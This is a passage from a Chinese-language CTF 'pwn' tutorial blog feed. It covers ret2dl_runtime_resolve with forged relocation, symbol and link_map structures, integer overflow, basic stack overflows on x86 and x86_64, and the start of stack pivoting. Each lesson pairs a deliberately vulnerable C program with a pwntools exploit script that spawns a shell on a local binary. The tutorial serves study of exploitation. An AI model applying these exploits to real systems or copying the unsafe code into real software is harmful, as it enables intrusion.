class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-2.jpg" srcset="/img/loading.gif" lazyload alt="bss段布局" title="bss段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-3.jpg" srcset="/img/loading.gif" lazyload alt=".dynamic段布局" title=".dynamic段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-4.jpg" srcset="/img/loading.gif" lazyload alt="dynsym段布局" title="dynsym段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-5.jpg" srcset="/img/loading.gif" lazyload alt="dynstr段布局" title="dynstr段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve1-6.jpg" srcset="/img/loading.gif" lazyload alt="rel.plt段布局" title="rel.plt段布局"></p><p><code>rel表项</code>需要构造 {对应<code>got表</code>地址(8字节), <code>sym表</code>中的索引值(4字节), 用来表示函数的<code>7</code>(4字节), <code>addend</code>用处未知一般为<code>0</code>(4字节)}</p><p><code>sym表项</code>需要构造 {<code>dnystr</code>中的索引值(4字节), 用来表示函数的<code>12</code>(1字节), <code>other</code>描述函数时为<code>0</code>(1字节), <code>shndx</code>描述函数时为0(2字节), <code>value</code>在函数被导出前为<code>0</code>(4字节), <code>size</code>描述函数时为<code>0</code>(4字节)}</p><p><code>dnystr表项</code>构造时只需要在字符串结尾使用<code>\x00</code>截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    构造 全局变量cache ,将 sym表项 与 rel表项 ，dynstr表项 都伪造好，</span><br><span class="hljs-string">    通过传入一个较大的 rel.plt表 索引值,</span><br><span class="hljs-string">    使其索引到我们伪造的表项,进而导出 system 函数，并执行 system 函数</span><br><span class="hljs-string">  需要计算rel的索引值和sym的索引值，还有system字符串在dynstr的索引值</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>rdi=<span class="hljs-number">0x00000000004012a3</span><br>p=process(<span class="hljs-string">&#x27;./pwn_resolve&#x27;</span>)<br>sym=p32(<span class="hljs-number">0x4040b9</span>-<span class="hljs-number">0x4004a0</span>)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> <span class="hljs-comment"># 0x4004a0为.dynstr表的地址 0x4040b9为system字符串位置</span><br>rel=p64(<span class="hljs-number">0x404018</span>)+p32(<span class="hljs-number">7</span>)+p64((<span class="hljs-number">0x404088</span>-<span class="hljs-number">0x4003e0</span>)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># 0x4003e0为sym表的地址 0x404088为伪造的sym表项的地址</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+sym+rel+<span class="hljs-string">&quot;\x00system\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x4033c0</span>)<br>p.send(payload)<br>pause()<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi)+p64(<span class="hljs-number">0x404080</span>)+p64(<span class="hljs-number">0x401020</span>)+p64((<span class="hljs-number">0x4040a0</span>-<span class="hljs-number">0x4005a8</span>)//<span class="hljs-number">0x18</span>)) <span class="hljs-comment"># 0x4005a8是rel表的地址 0x4040a0为伪造的rel表项的地址</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="伪造link-map">伪造link_map</h2><blockquote><p>这种方法需要先获取描述当前程序的<code>link_map</code>结构体的<code>scope</code>成员中储存的数据<br>想要获取<code>scope</code>成员中的数据，至少需要达到任意地址读取，这种情况下已经可以泄露libc的地址<br>而想要利用<code>ret2resolve</code>则需要控制程序流程<br>这种情况下，已知<code>libc</code>地址，且可以控制程序，直接执行<code>system(&quot;/bin/sh&quot;);</code>就可以了<br>想要利用<code>link_map</code>还需要 至少<code>0x400</code>的空间，<br>这种情况下，想要伪造<code>link_map</code>,达到<code>ret2dlresolve</code>的目的，利用难度较高<br>如果作为栈溢出的利用</p></blockquote><blockquote><p>以下是我尝试伪造<code>link_map</code>的代码,比较极端地允许输入任意长度的数据</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> a[<span class="hljs-number">4096</span>]=&#123;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> b[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start\naddr: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-type">int</span>)a);<br>    gets(b);<br>    gets(a);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;123123&quot;</span>);<br><br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -fno-stack-protector -no-pie 1.c</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp 0x401201&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;addr: &#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>fake_dyn=d+<span class="hljs-number">0x300</span><br>fake_map=p64(<span class="hljs-number">0</span>)+p64(d)+p64(fake_dyn)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(d)+p64(<span class="hljs-number">0</span>)+p64(d)<br>fake_info=p64(<span class="hljs-number">0</span>)+p64(fake_dyn)+p64(<span class="hljs-number">0x403f00</span>)+p64(fake_dyn+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_dyn+<span class="hljs-number">0x20</span>)+p64(fake_dyn+<span class="hljs-number">0x30</span>)+p64(fake_dyn+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0x403f40</span>)+\<br>        p64(<span class="hljs-number">0x403f50</span>)+p64(<span class="hljs-number">0x403ec0</span>)+p64(<span class="hljs-number">0x403ed0</span>)+p64(<span class="hljs-number">0x403e30</span>)+p64(<span class="hljs-number">0x403e40</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0x403f10</span>)+p64(<span class="hljs-number">0x403ee0</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_dyn+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x403e50</span>)+\<br>        p64(<span class="hljs-number">0x403e70</span>)+p64(<span class="hljs-number">0x403e60</span>)+p64(<span class="hljs-number">0x403e80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0x403f70</span>)+p64(<span class="hljs-number">0x403f60</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">14</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">25</span>+p64(<span class="hljs-number">0x403e90</span>)<br>seg=d+<span class="hljs-number">0x500</span><br>got=seg<br>strtab=seg+<span class="hljs-number">0x100</span><br>symtab=seg+<span class="hljs-number">0x200</span><br>reltab=seg+<span class="hljs-number">0x300</span><br>jmprel=seg+<span class="hljs-number">0x400</span><br>fake_map=fake_map+fake_info<br>fake_map=fake_map.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(fake_map)))<br>dyn_sym=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">24</span>)+p64(<span class="hljs-number">3</span>)+p64(got)+p64(<span class="hljs-number">5</span>)+p64(strtab)+p64(<span class="hljs-number">6</span>)+p64(symtab)+p64(<span class="hljs-number">7</span>)+p64(reltab)+p64(<span class="hljs-number">0x17</span>)+p64(jmprel)<br>dyn_sym=dyn_sym.ljust(<span class="hljs-number">0x98</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_map=fake_map+dyn_sym<br>nnn=<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>fake_map=fake_map+p64(nnn)<br><span class="hljs-comment">#因为只是测试，所以直接用gdb获取scope的值，然后输入就可以了</span><br>fake_map=fake_map.ljust(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>got_d=p64(<span class="hljs-number">0x405068</span>)<br>got_d=got_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>strtab_d=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&quot;system\x00&quot;</span><br>strtab_d=strtab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>symtab_d=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p32(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0x12</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)<br>symtab_d=symtab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>reltab_d=p64(<span class="hljs-number">0</span>)<br>reltab_d=reltab_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>jmprel_d=p64(got)+p32(<span class="hljs-number">7</span>)+p64(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">1</span>)<br>jmprel_d=jmprel_d.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>fake_map=fake_map + got_d + strtab_d + symtab_d + reltab_d + jmprel_d<br>bin_sh=<span class="hljs-built_in">len</span>(fake_map)+<span class="hljs-number">0x40</span><br>fake_map=fake_map.ljust(bin_sh,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_map=fake_map+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040101a</span>)+p64(<span class="hljs-number">0x0000000000401273</span>)+p64(d+bin_sh)+p64(<span class="hljs-number">0x401026</span>)+p64(d)+p64(<span class="hljs-number">0</span>))<br>p.sendline(fake_map)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整型溢出及栈基础</title>
    <link href="/page/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E5%9F%BA%E7%A1%80/"/>
    <url>/page/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1>整数溢出</h1><p>由于数据类型的使用不当产生的利用点<br>如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">10</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,c,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">if</span> (c[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>        a=atoi(c);<br>        <span class="hljs-keyword">if</span> (a&gt;=<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (a&lt;<span class="hljs-number">10</span>) &#123;<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个示例中，输入<code>4294967295</code>，是可以执行 <code>system(&quot;/bin/sh&quot;);</code> ，因为<code>a</code>是<code>int</code>类型，默认为<code>4字节有符号整型</code>，而<code>4294967295</code>的十六进制为 <code>0xffffffff</code>,刚好为<code>-1</code>的补码 ，所以实际a的值为<code>-1</code>, <code>-1&lt;0&lt;10</code>,所以可以绕过判断执行<code>system(&quot;/bin/sh&quot;);</code></p><h1>栈溢出</h1><h2 id="简单溢出">简单溢出</h2><blockquote><p>当程序对输入的数据大小没有限制或限制不严谨，就会出现栈溢出</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> *binsh=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;date&quot;</span>);<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc 1.c -m64 -o s64 -fno-stack-protector -no-pie</span><br><span class="hljs-comment">    gcc 1.c -m32 -o s32 -fno-stack-protector -no-pie</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="x86">x86</h3><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA.jpg" srcset="/img/loading.gif" lazyload alt="调用vuln函数过程" title="调用vuln函数过程"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数返回过程" title="vuln函数返回过程"></p><p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，且参数就放在 返回地址后面，这样调用某个函数并传参非常方便</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA1-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    通过栈溢出，控制返回地址为 system@plt ,并设置参数为 &quot;/bin/sh&quot; </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    system函数在plt表中的地址为 0x8049090</span><br><span class="hljs-string">    /bin/sh 字符串在程序中的地址为 0x804a008</span><br><span class="hljs-string">    ret 指令地址为 0x804900e</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./s32&#x27;</span>)<br><br>ret=<span class="hljs-number">0x0804900e</span><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x8049090</span>)+p32(ret)+p32(<span class="hljs-number">0x804a008</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    设置vuln函数返回地址为 0x8049090</span><br><span class="hljs-string">    设置system函数返回地址为 0x804900e (任意地址)</span><br><span class="hljs-string">    设置system函数参数为 0x804a008</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="x86-64">x86_64</h3><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-2.jpg" srcset="/img/loading.gif" lazyload alt="调用vuln函数过程" title="调用vuln函数过程"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数返回过程" title="vuln函数返回过程"></p><p>通过返回过程可以看出，如果将栈中储存的<code>vuln返回地址</code>修改了，就可以控制程序执行流程，但前6个参数通过寄存器传入，调用某个函数并传参，就比较麻烦，需要找到<code>pop xxx;ret</code> 指令，控制寄存器</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA2-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    通过栈溢出，先调用 pop rdi;ret 指令，设置 system函数 的参数，</span><br><span class="hljs-string">    然后调用 system@plt </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    system函数在plt表中的地址为 0x401060</span><br><span class="hljs-string">    /bin/sh 字符串在程序中的地址为 0x402004</span><br><span class="hljs-string">    ret 指令地址为 0x40101a</span><br><span class="hljs-string">    pop rdi;ret 指令地址为 0x4012b3</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>rdi=<span class="hljs-number">0x4012b3</span><br>ret=<span class="hljs-number">0x40101a</span><br>p=process(<span class="hljs-string">&#x27;./s64&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp %s&#x27;</span>%ret)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(<span class="hljs-number">0x402004</span>)+p64(<span class="hljs-number">0x401060</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    设置vuln函数返回地址为 0x40101a 用来对齐栈</span><br><span class="hljs-string">    设置rdi寄存器的值为 0x402004</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-4.jpg" srcset="/img/loading.gif" lazyload alt=""><br>因为在<code>system</code>函数中 执行了指令 <code>movaps xmmword ptr[rsp+0x50],xmm0</code>, 即 向 <code>rsp+0x50</code>的地址处写入 <code>128</code> 位的数据, 而 <code>movaps</code>指令需要对齐，所以<code>rsp+0x50</code>指向的地址就要与<code>128位</code>(<code>0x10字节</code>)对齐 ,但这里<code>rsp</code>指向的地址为<code>0x7ffcc3740e48</code>显然无法与<code>0x10</code>对齐, 所以在执行<code>system</code>函数时会导致程序中断, 虽然按照逻辑是可以获取<code>shell</code>的,但因为程序中断了,所以获取不了<code>shell</code></p><h2 id="栈迁移">栈迁移</h2><blockquote><p>当存在栈溢出，但溢出的数据较小时，可以尝试使用栈迁移</p></blockquote><h3 id="能够覆盖ret">能够覆盖ret</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*样例代码*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x30</span>);<br>    write(<span class="hljs-number">1</span>,a,<span class="hljs-number">0x30</span>);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><blockquote><p>在这个仅向栈中写入数据的例子中，数据的地址必须通过<code>rbp</code>计算得到</p></blockquote><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB.jpg" srcset="/img/loading.gif" lazyload alt="main 函数代码" title="main 函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-1.jpg" srcset="/img/loading.gif" lazyload alt="main 函数栈布局" title="main 函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-%E8%BF%81%E7%A7%BB-2.jpg" srcset="/img/loading.gif" lazyload alt="main 函数汇编代码" title="main 函数汇编代码"><br>存在 <code>leave;ret</code> 相当于 <code>mov rsp,rbp;pop 